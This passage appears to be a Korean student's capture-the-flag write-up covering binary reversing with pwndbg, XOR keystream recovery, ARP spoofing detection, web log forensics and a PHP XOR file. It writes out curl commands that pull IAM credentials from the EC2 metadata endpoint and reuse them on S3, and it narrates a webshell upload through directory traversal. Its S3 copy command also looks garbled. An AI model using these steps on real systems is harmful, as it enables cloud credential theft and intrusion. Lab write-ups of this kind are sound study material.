   0x000055555555534a <+63>:    jle    0x555555555320 <func2+21>
   0x000055555555534c <+65>:    nop
   0x000055555555534d <+66>:    nop
   0x000055555555534e <+67>:    pop    rbp
   0x000055555555534f <+68>:    ret
End of assembler dump.
```
위 코드를 보면 func1과 마찬가지로 $rbp-0x4의 값이 0x3f보다 커질 경우 반복을 중단하는 것을 확인할 수 있다. 이때 func2+12를 보먄 rbp-0x4에 0x1을 넣는 것을 확인 할 수 있는데 func2에서는 홀수번째의 값들을 변경시킨다는 것을 예측할 수 있다.

이번에도 11111111을 입력하고 해당 함수가 반복하는동안 어떻게 값이 변하는지 확인해본결과
```pyhton
00:0000│ rbp rsp 0x7fffffffe0b0 —▸ 0x7fffffffe160 ◂— 0x1
01:0008│+008     0x7fffffffe0b8 —▸ 0x55555555547e (main+302) ◂— lea rax, [rbp - 0xa0]
02:0010│ rdi     0x7fffffffe0c0 ◂— 0x1a401a401a401a40
03:0018│+018     0x7fffffffe0c8 ◂— 0x2b0f2b0f2b0f2b0f
```

1(0x31)이 1a로 바뀐것을 확인할 수 있다. 또 0x00이었던 부분은 2b로 바뀐것을 확인할 수 있다. 위 코드에서 func2+50번째 코드를 보면 xor 0x2b를 하는 것을 확인할 수 있는데 이것을 통해 홀수번째 값들은 0x2b와 xor연산을 한다는것을 예측할 수 있다. 이후 main함수에서 memcmp부분을 break하고 어떤 값을 비교하는지 확인해봤다.

```python
 0x55555555547e <main+302>    lea    rax, [rbp - 0xa0]
   0x555555555485 <main+309>    mov    edx, 0x40
   0x55555555548a <main+314>    lea    rcx, [rip + 0x2b8f]           <target>
   0x555555555491 <main+321>    mov    rsi, rcx
   0x555555555494 <main+324>    mov    rdi, rax
 ► 0x555555555497 <main+327>    call   memcmp@plt                <memcmp@plt>
        s1: 0x7fffffffe0c0 ◂— 0x1a401a401a401a40
        s2: 0x555555558020 (target) ◂— 0x1e71137412701271
        n: 0x40

   0x55555555549c <main+332>    test   eax, eax
   0x55555555549e <main+334>    jne    main+365                <main+365>
```
s1은 내가 입력한 값의 변환 후 문자열이고 s2는 이 파일에서 원하는 정답의 문자열이라고 예측을 할 수있다. 여기서 n은 비교할 문자열의 바이트수인데 0x40으로 되있는 것을 봐서 0x40만큼의 문자열을 비교하는 것을 알 수 있고 0x40만큼의 target 문자열을 확인해봤다.

```python
pwndbg> x/64bx 0x555555558020
0x555555558020 <target>:        0x71    0x12    0x70    0x12    0x74    0x13    0x71    0x1e
0x555555558028 <target+8>:      0x72    0x48    0x44    0x48    0x74    0x12    0x43    0x4d
0x555555558030 <target+16>:     0x70    0x18    0x3f    0x12    0x70    0x49    0x73    0x13
0x555555558038 <target+24>:     0x74    0x1d    0x75    0x1f    0x71    0x1e    0x48    0x1c
0x555555558040 <target+32>:     0x46    0x18    0x72    0x1c    0x73    0x4a    0x47    0x48
0x555555558048 <target+40>:     0x72    0x1a    0x43    0x1d    0x74    0x4d    0x75    0x1f
0x555555558050 <target+48>:     0x46    0x4a    0x48    0x1a    0x46    0x4d    0x40    0x1a
0x555555558058 <target+56>:     0x44    0x1e    0x74    0x13    0x3f    0x18    0x3f    0x49
```
위에서 s2의 값과 target값이 같은 것을 확인했고 비교할 모든 값은 target+56까지의 값인 0x40만큼의 값인것을 확인할 수 있다.

### 접근방식
내가 입력한 값의 홀수번째들은 0x2b와 xor연산을 진행하고, 짝수번째들은 0xf를 더하는것을 알 수 있다. 따라서 위 target의 값들에서 홀수번째들을 다시 0x2b와 xor연산을 수행하고, 짝수번째들은 0xf를 빼주고 그 값들을 입력해주면 flag를 획득할 수 있을 것이다. 이때 xor의 특징은 똑같은 값으로 다시 xor연산을 수행하면 다시 원래 값으로 돌아가는 특징을 가지고 있다. 또 메모리는 리틀엔디안이므로 값을 뒤에서부터 변환시켜줘야한다.


### 코드작성
```python
hex_num = [
    [0x71, 0x12, 0x70, 0x12, 0x74, 0x13, 0x71, 0x1e],
    [0x72, 0x48, 0x44, 0x48, 0x74, 0x12, 0x43, 0x4d],
    [0x70, 0x18, 0x3f, 0x12, 0x70, 0x49, 0x73, 0x13],
    [0x74, 0x1d, 0x75, 0x1f, 0x71, 0x1e, 0x48, 0x1c],
    [0x46, 0x18, 0x72, 0x1c, 0x73, 0x4a, 0x47, 0x48],
    [0x72, 0x1a, 0x43, 0x1d, 0x74, 0x4d, 0x75, 0x1f],
    [0x46, 0x4a, 0x48, 0x1a, 0x46, 0x4d, 0x40, 0x1a],
    [0x44 ,0x1e, 0x74, 0x13, 0x3f, 0x18, 0x3f, 0x49]
]

for num_list in hex_num:
    result = ""
    for i in range(0, 8, 2):
        result += chr(num_list[i] - 0xf) + chr(num_list[i + 1] ^ 0x2b)
    print(result, end='')

```

### 문제해결
위 코드에서 같이 target의 문자열을 가져와 변환을 시켜주는데 리틀엔디안으로 인해 순서가 바뀌었으니 변환하는 방식도 홀수번째가 0xf를 빼주고 짝수번째가 0x2b를 xor연산하는 방식으로 바꿨다. 해당 코드를 실행시켜주고 출력된 값을 input으로 넣어주면 flag를 획득할 수 있다.


## L.ror-key

### 분석한 내용
해당 문제의 전체 코드는 다음과같다.

```python
#!/usr/bin/env python3
import sys

def flag_enc():
    # flag 내용 포맷확인
    with open('./flag', 'r') as f:
        flag = f.read()
        assert flag.startswith('flag{')
        assert flag.endswith('}')
        flag = flag[3:-1]

    with open('./keystream', 'r') as f:
        key = f.read()
    
    flag_enc = ""
    for f, k in zip(flag, key[:len(flag)]):
        flag_enc += chr(ord(f) ^ ord(k))

    with open('encfile', 'w') as f:
        f.write(flag_enc)

    return key

def main():
    key = flag_enc()

    set_key = ''
    set_key += key[6:24]
    set_key += key[:6]

    plain = "Solvesolvecansolvesogood"

    plain_enc = ""
    for p,k in zip(plain, set_key[:len(plain)]):
        plain_enc += chr(ord(p) ^ ord(k))

    with open('plain_enc', 'w') as f:
        f.write(plain_enc)


if __name__ == '__main__':
    main()

```
처음 이 파일 현재디렉토리에 flag라는파일을 읽기 모드로 불러와 flag변수에 저장하고 양쪽에 존재하는 `flag{}` 문자열을 제거해줘 안에 있는 문자열만 flag 변수에 저장시켰다. 그리고 현재 디렉토리에 keystream이라는 파일을 r모드로 열고 해당 문자열을 key에 저장한다. 이후 flag와 keystream문자열을 한글자씩 xor연산을 수행하고 결과를 encfile에 저장한다. 마지막으로 keystream의 값을 리턴하고 해당 값을 [6:24] + [:6]까지 key인덱스 값을 set_key에 저장한다. 이후 plain의 저장된 값과 xor연산을 한뒤 plain_enc에 저장한다.


### 접근방식
해당 문제에서는 keystream과 flag를 xor연산한 encfile과 문자열 순서를 조금 바꾼 keystream과 `Solvesolvecansolvesogood` 문자열을 xor연산한 plain_enc파일을 제공해준다. 이전문제에서 말해던 xor연산은 똑같은 값으로 다시 연산할 경우 처음 값으로 돌아온다는 특징을 가지고 plain_enc파일을 `Solvesolvecansolvesogood`문자열과 다시 xor연산을 수행한다. 수행해 나온 문자열에서 뒤에서부터 6개의 문자를 앞으로 가져오면 그 문자열이 keystream이 된다. 따라서 그 값을 다시 encfile과 xor연산을 수행하면 flag를 얻을 수 있다.

### 코드작성
```python
def decrypt(ciphertext, key):
    result = ""
    for c, k in zip(ciphertext, key):
        result += chr(ord(c) ^ ord(k))
    return result

# 암호화된 파일 읽기
with open('plain_enc', 'r') as f:
    ciphertext = f.read()

# 원래의 plain 문자열
plain = "Solvesolvecansolvesogood"

# XOR 연산을 통해 키스트림 추정
key = decrypt(ciphertext, plain)
print(key)
```
위 코드는 keystream을 얻는 코드이다.


```python
with open('encfile', 'rb') as f:
    str1 = f.read()

plain = "Solvesolvecansolvesogood"
key = "c2xhxmFzZGxhYW5zxHNhxnNs"

# 확인을 위해 두 문자열의 길이를 출력
print(len(str1), len(key))

result = b""
for i in range(len(str1)):
    result += bytes([str1[i] ^ ord(key[i])])

print(result)

```
위코드는 flag를 얻는 코드다


### 문제해결
처음 코드를 실행해 나온 문자열에서 뒤에 6개 문자를 앞으로 가져와 두번째 코드 key부분에 넣고 실행하면 flag를 획득할 수 있다.


## P.MetaData

### 분석한 내용
문제에서 EC2에 접속할 수 있는 id와 pw를 제공해주니 접속을 해줬고, ls, pwd 등 여러 명령어를 실행시켜준 결과 대부분의 코드가 막혀있었다. 그리고 현재 서버로 요청을 보내기위해 curl명령어를 해본결과 해당 명령어는 잘 작동했다.

### 접근방식
일단 curl이 통하는 것을 확인했으니 curl명령어를 통해 메타데이터를 조회를 할 수 있을 것이다. 메타데이터를 조회한 뒤 AWS S3버킷에 접속하는데 필요한 IAM 크리덴셜 정보들을 통해 A3버킷에 접근해 flag를 획득하면 될것이다.

### 코드작성
```bash
ssh ubuntu@{IP} -p {IP}

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{위 명령어를 통해 출력된 IAM 역할 이름}


# 내 컴퓨터
aws configure
aws s3 ls s3://{버킷이름}
aws s3 cp ~/ s3://{버킷이름}/{flag위치}
```

### 문제해결
위의 명령어를 순서대로 실행하면 flag를 획득할 수 있다.



## Q.Find_victim

### 분석한 내용
해당 문제서버에 접속하면 리눅스 터미널같은 화면이 출력되고 명령어를 사용할 수 있는 부분이 존재한다. 우선 arp스푸핑을 받고있다고 하니 `arp -a`를 통해 arp 테이블을 확인해봤다.

확인해본결과 다음과 같이 출력이 되었다.

```python
가상 ARP 테이블 (arp -a):
?     192.168.1.1          at cb:80:e0:71:da:ca    [Ether]    on eth0      
?     192.168.1.2          at c7:de:0a:27:f5:31    [Ether]    on eth0      
?     192.168.1.3          at 6a:08:eb:57:76:cd    [Ether]    on eth0      
?     192.168.1.4          at 7f:66:1e:ed:11:c2    [Ether]    on eth0      
?     192.168.1.5          at 7f:03:0f:ac:9a:a4    [Ether]    on eth0      
?     192.168.1.6          at 4a:1c:7d:d9:67:c6    [Ether]    on eth0      
?     192.168.1.7          at c7:de:0a:27:f5:31    [Ether]    on eth0      
?     192.168.1.8          at 92:4b:c2:0d:06:bc    [Ether]    on eth0      
?     192.168.1.9          at 37:82:15:c6:b8:ca    [Ether]    on eth0      
?     192.168.1.10         at 85:49:f9:8f:ca:b2    [Ether]    on eth0 
```

패킷이 전달될 때 보통 IP주소를 통해 수신자를 지정한다. 그러나 IP주소는 네트워크 라우팅을 위해 사용되는 것일 뿐 실제로 데이터 링크 계층에서 패킷을 전달할 때는 MAC주소를 사용한다. 이때 ARP는 이 IP주소를 MAC주소로 변환하는 역할을 한다. 즉, ARP는 특정 IP주소를 가진 호스트의 MAC주소를 알아내는 데 사용된다. 이렇게 네트워크에 연결된 각 장치는 IP주소와 MAC주소의 매핑 정보를 가지게 된다. 

ARP스푸핑공격은 공격자가 이 매핑 정보를 조작해 자신의 MAC주소를 피해자의 IP주소와 연결시켜 네트워크상에서 다른 장치들이 피해자의 IP주소로 패킷을 보낼 때 실제로 공격자의 장치로 패킷을 보내게 된다. 즉 피해자와 서버가 패킷을 주고받을 때 공격자의 시스템을 게이트웨이로 사용하게 되는것이다 이러한 공격을 흔히 중간자 공격이라 한다. 따라서 위에서 `arp -a`를 통해 arp테이블을 확인해본 결과 192.168.1.2와 192.168.1.7의 MAC주소가 같은 것을 보아 두 ip가 피해자 or 공격자라는 것을 확인했다.



### 접근방식
문제에서 보면 공격자는 피해자에게 계속해서 arp공격을 지속해서 하고있다고 하였다. 이떄 arping명령어를 통해 피해자 시스템에게 직접적으로 요청을 보내 mac주소를 확인하면 기존 mac주소를 확인할 수 있을 것이다.

### 코드작성
```bash
arp -a
arping 192.168.1.2 -c 10
arping 192.168.1.7 -c 10
```

### 문제해결
arping는 해당 ip에 ping을 보내 요청값을 받는명령어다 해당 요청값에 mac주소도 포함이 되어있다.

우선 위 명령어에서 arp -a를 통해 mac주소가 같은 ip를 확인하고 arping를 통해 혹시 모르니 10개의 요청을 날려 보내고 확인해보면 기존 mac주소를 확인할 수 있을 것이다.


## R.looooog

### 분석한 내용
해당 문제에서는 web log파일을 제공해준다. 나는 해당 문제를 풀기위해 http logs viewer도구를 사용했다. 해당 도구를 통해 봤을 때 IP address와 date Reqeust를 보여준다. 우선 문제 내용을 보면 어떠한 웹 공격이 발생했다는 것을 추측할 수 있다. 웹해킹의 특성상 web log가 많이남는 다는것을 이용해서 Ip address로 정렬을 시켜 요청을 많이 보낸 ip를 몇개 추려봤다.

```text
101.234.148.201
102.38.242.12
102.176.128.68
103.114.88.12
103.129.46.96
103.143.48.213
103.144.176.54
104.129.96.57
104.134.141.77
```
위 IP들을 각각 필터링해 살펴본 결과 `103.114.88.12`IP에서 `../../`를 발견했는데 Directory Traversal 공격이 이루어진것을 확인했다.

### 접근방식
```

```


우선 `103.114.88.12`IP가 공격자라는 것을 확인했고 처음 접속 시간을 체크했다. 처음 접속시간은 2024-01-14 오전 9:06:27 인것을 확인했다.

이후 공격자가 어떤 요청을 보냈는지 확인해봤는데 로그인을 한 이후 `/dashboard`, `/alert`, `/task/CreateTicket.jsp`, `/app/Upload.jsp` 등을 접근했는데 dashboard, alert 등 모두 무언가 작성하거나 파일을 올릴 수 있는 페이지라는 것을 예측할 수 있다. 이후 공격자는 `/app/upload.jsp`를 통해 `jpg, png, txt, html, jsp`의 파일들이 올라가는 것을 확인했고 올린 jsp파일을 `/app/upload/data/abc.jsp`에 접속해 웹쉘 작동을 확인하려했지만 해당 디렉토리에 실행권한이 없어서 그랬는지 파일을 다시 `../../`문자를 통해 `/app`위치에 업로드를 시킨다. 이후 웹쉘에서 cmd파라미터를 통해 여러 명령어를 사용했고 `/home/whs`에 `whs.secret`이라는 파일을 발견했다. 공격자는 이 파일을 download하기위해 dd.jsp라는 파일을 download할 수 있는 jsp파일을 업로드해 whs.seret파일을 다운받았다.


## X.XOR master

### 분석한 내용
해당 문제에서 공격자가 생성한 파일이름이 config.php라는 것을 알려줬다. 따라서 위에서 사용한 도구를 이용해 config.php 문자열을 찾아본 결과 `POST /config.php?key=abcdefgqwerty HTTP/1.1` 라는 요청을 확인했다.

config.php코드는 
```php
<?php
	$key = $_GET["key"];
	$data = $_POST["data"];

	$result = "";

	$fp = fopen("brand.jpg","w+");

	for ($i = 0; $i < strlen($data);  $i++)
	{
		$x = $key[($i+4)%strlen($key)]^$data[$i];

		echo $x;

		$result = $result.$x;
	}

	fwrite($fp, $result);
	fclose($fp);

?>
```
이와 같은데 post로 받은 data과 get으로 받은 key를 xor연산하고 brand.jpg에 저장한다. 이때 key가 data보다 문자열이 적을경우 key의 문자를 처음부터 다시 사용한다.


### 접근방식
우선 get요청으로 받았던 key값이 `abcdefgqwerty`라는 것을 확인했으니 brand.jpg 파일을 읽어 key값과 다시 xor연산을 시키면 flag를 획득할 수 있다.

### 코드작성
```python
key = "abcdefgqwerty"

with open('brand.jpg', 'rb') as f:
    data = f.read()


result = bytearray()
key_len = len(key)


for i in range(len(data)):
    x = ord(key[(i + 4) % key_len]) ^ data[i]
    result.append(x)

print(result)

```

### 문제해결
위 코드에서 bytearray는 바이트이루어진 빈 배열을 생성한다는 것이다. 코드를 실행시키면 flag를 획득할 수 있다.


## W.Send Protocol

### 분석한 내용
문제의 내용을 보면 서버에 메시지 타입(1바이트), 메시지 길이(2바이트), 데이터(최대 20바이트, flag포함 단어)를 보내면 응답을 받는다고 한다. 해당 요청을 보내기 위해 소켓 프로그래밍을 요구하는 것같다.


### 코드작성
```python
import socket

def send_request(data):
    server_address = ('127.0.0.1', 12345)

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect(server_address)

        request_message = b'\x01'
        request_message += len(data).to_bytes(2, byteorder='big')
        request_message += data.encode('utf-8')

        client_socket.sendall(request_message)

        response = client_socket.recv(1024)
        print("서버 응답:", response.decode('utf-8'))

    finally:
        client_socket.close()

send_request('flag')

```
파이썬으로 작성을 하였고 문제서와 같이 docker를 구동시킨 뒤 127.0.0.1, 12345로 서버정보를 입력한뒤 소캣을 생성하고 메시지타입 1바이트, 그리고 나는 보낼 데이터를 함수의 파라미터로로 만들었으므로 data변수의 데이터 크기, data로 요청 메시지를 만들었고 전송했다. 이후 응답데이터를 1024바이트만큼 받아줬다.


### 문제해결
위 코드에서 보낼문자에 단순히 flag라는 것을 보낸결과 flag를 출력해줬다.